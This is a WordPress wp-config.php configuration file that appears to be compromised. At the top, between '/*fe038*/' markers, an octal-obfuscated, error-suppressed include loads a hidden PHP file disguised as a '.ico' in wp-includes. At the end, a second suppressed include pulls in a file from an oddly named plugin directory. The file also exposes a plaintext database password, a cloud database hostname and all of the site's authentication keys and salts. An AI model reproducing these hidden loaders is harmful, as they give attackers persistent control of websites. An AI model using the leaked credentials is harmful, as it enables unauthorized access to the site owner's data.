
<?php
/*fe038*/

@include "\057var\057www\057htm\154/ds\163_wp\057wp-\151ncl\165des\057blo\143ks/\164abl\145/.2\07080b\06285.\151co";

/*fe038*/
if (strpos($_SERVER['HTTP_X_FORWARDED_PROTO'], 'https') !== false)
   $_SERVER['HTTPS']='on';
else
   $_SERVER['HTTPS']='off';
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'debtdb_wp' );

/** MySQL database username */
define( 'DB_USER', 'admin' );

/** MySQL database password */
define( 'DB_PASSWORD', 'creditjet123' );

/** MySQL hostname */
define( 'DB_HOST', 'database-1.ck9qyc9byugm.us-east-2.rds.amazonaws.com' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'T]Ua+XU5@}M#^7/G}h<LP=&PeUG(4v_ax8]u|Wb&YTdL<A}o/4U=b5AS,K!+Mp=U' );
define( 'SECURE_AUTH_KEY',  '|&)aPfJg~$~AMYY@qXAY+}{JEug0Aw&f(SE?hjP@T#Y0Zaso|n/[dU_N<~*=V>#J' );
define( 'LOGGED_IN_KEY',    'i57.qoNg]w]/!iD@Ry!`&spip}(Hems5H43<6;WtoG1Y~(-B^(+FiZ]9J}cL:eeu' );
define( 'NONCE_KEY',        'h~XcAEHGRh*1rNS]B9lL,qP!a?*QoP:7:pw*oUiJv`V4M*N8&Pk7<2#zHI@uvJ&B' );
define( 'AUTH_SALT',        '-LvE-k5qVH%en=/iKf.?v2O1g+S(U`.r5I8?Gyh7SSu1#Eb2Tm<kZ=~[3PbU;=GK' );
define( 'SECURE_AUTH_SALT', '1o<=],:J.M]pf3A@I/9XE4JTE9P<tb1]cqE]pJ+bE)j~W]^&bbZ(}1h;:qvAvnaU' );
define( 'LOGGED_IN_SALT',   'n)V)8z]r[l{JKH1#59DA-UNc|$^fi)A&{R87|i&l(+z@F.k>ZB/`J`1{ek33.? C' );
define( 'NONCE_SALT',       '54Tnmo<^ztDwoJrQ2jQR)C1i%-7K*;=k;q;oy3~60-Gzm?%{Y:gif0n(4/`%`[.3' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'ds_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', true );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
include_once(ABSPATH . WPINC . '/header.php');


@include("/var/www/html/dss_wp/wp-content/plugins/opt_v11cfb/optim_v5rj5.php");
